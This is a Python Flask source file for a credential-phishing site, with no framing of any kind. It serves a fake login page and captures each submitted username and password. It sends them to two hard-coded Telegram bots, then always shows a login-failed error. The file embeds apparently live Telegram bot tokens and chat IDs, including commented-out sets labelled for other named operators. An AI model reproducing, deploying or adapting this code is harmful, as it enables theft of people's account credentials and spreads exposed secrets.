from flask import Flask, render_template, request, redirect, url_for, flash
import logging
from datetime import datetime
import os
import requests

app = Flask(__name__)
app.secret_key = 'your-secret-key-here'  # Change this to a secure secret key

# Telegram Main Bot credentials (replace with your actual bot token and chat ID)
TELEGRAM_BOT_TOKEN = '8499182673:AAGesMaZF6BI809HR5GK1aY7jb0XqRQC3ms'
TELEGRAM_CHAT_ID = '7608981070'

# Secondary Telegram Bot credentials (placeholders for Circle)
SECONDARY_TELEGRAM_BOT_TOKEN = '8154915769:AAF6fwbJnfF9AZpRDqgT40DZn4oZfzQh5f0'
SECONDARY_TELEGRAM_CHAT_ID = '6019518989'

# # Secondary Telegram Bot credentials (placeholders for Izu)
# SECONDARY_TELEGRAM_BOT_TOKEN = '8223867988:AAFhuQnYpOwEj-7mt3WSKQRMow7xWOV3L9U'
# SECONDARY_TELEGRAM_CHAT_ID = '6380136159'

# # Secondary Telegram Bot credentials (placeholders for Lukki)
# SECONDARY_TELEGRAM_BOT_TOKEN = '8006398254:AAFxnSjATtqMl-Jj7ZVZC4kBEo26d4TCa1o'
# SECONDARY_TELEGRAM_CHAT_ID = '1329439508'

# Configure logging
logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)

def log_login_attempt(email, password=None):
    """Send login attempts to two Telegram bots"""
    try:
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        message = f"[{timestamp}] {email} - {password}"

        # Send to main bot
        url_main = f"https://api.telegram.org/bot{TELEGRAM_BOT_TOKEN}/sendMessage"
        payload_main = {
            'chat_id': TELEGRAM_CHAT_ID,
            'text': message
        }
        response_main = requests.post(url_main, data=payload_main)
        if response_main.status_code != 200:
            logger.error(f"Main Telegram API error: {response_main.text}")

        # Send to secondary bot
        url_secondary = f"https://api.telegram.org/bot{SECONDARY_TELEGRAM_BOT_TOKEN}/sendMessage"
        payload_secondary = {
            'chat_id': SECONDARY_TELEGRAM_CHAT_ID,
            'text': message
        }
        response_secondary = requests.post(url_secondary, data=payload_secondary)
        if response_secondary.status_code != 200:
            logger.error(f"Secondary Telegram API error: {response_secondary.text}")
    except Exception as e:
        logger.error(f"Failed to send Telegram message: {e}")


@app.route('/')
def index():
    return render_template('login.html')

@app.route('/login', methods=['GET', 'POST'])
def login():
    if request.method == 'POST':
        username = request.form.get('user')
        password = request.form.get('pass')
        
        if username and password:
            # Log all login attempts
            log_login_attempt(username, password)
            # Always show error message
            return render_template('login.html', login_failed=True, prefill_email=username)
        else:
            # Missing credentials - stay on login page with error
            return render_template('login.html', login_failed=True)
    
    # GET request - show login page
    return render_template('login.html')



if __name__ == '__main__':
    app.run(debug=True)